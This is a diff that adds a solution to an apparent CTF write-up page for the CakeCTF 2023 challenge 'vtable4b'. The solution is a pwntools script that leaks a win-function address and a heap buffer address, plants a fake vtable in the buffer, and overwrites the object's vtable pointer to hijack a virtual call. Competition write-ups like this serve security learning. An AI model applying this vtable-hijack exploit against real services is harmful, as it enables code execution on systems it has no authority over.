@@ -3,4 +3,34 @@ title: vtable4b - CakeCTF 2023
 sidebar_label: vtable4b
 ---
 
-coming soon ...
+Solution:
+
+```python
+from pwn import *
+
+p = remote ('vtable4b.2023.cakectf.com', 9000)
+
+# get address of win function
+p.recvuntil(b'<win> = ')
+win_addr = int(p.recvline().strip(), 16)
+print('win address: ', hex(win_addr))
+
+# get address of new vtable
+p.sendlineafter(b'> ', b'3')
+new_vtable_addr = p.recvuntil(b' | <-- message (= \'')
+new_vtable_addr = new_vtable_addr[:-(19+16+3)]
+new_vtable_addr = int(new_vtable_addr[-12:], 16)
+print('new vtable address: ', hex(new_vtable_addr))
+
+# craft new vtable
+buf  = b''
+buf += p64(win_addr) # new Cowsay::dialog address
+buf += b'A' * 3*8 # padding to vtable address
+buf += p64(new_vtable_addr) # overwrite vtable with message address
+p.sendlineafter(b'> ', b'2')
+p.sendlineafter(b'Message: ', buf)
+
+# call dialog (or win)
+p.sendlineafter(b'> ', b'1')
+p.interactive()
+```
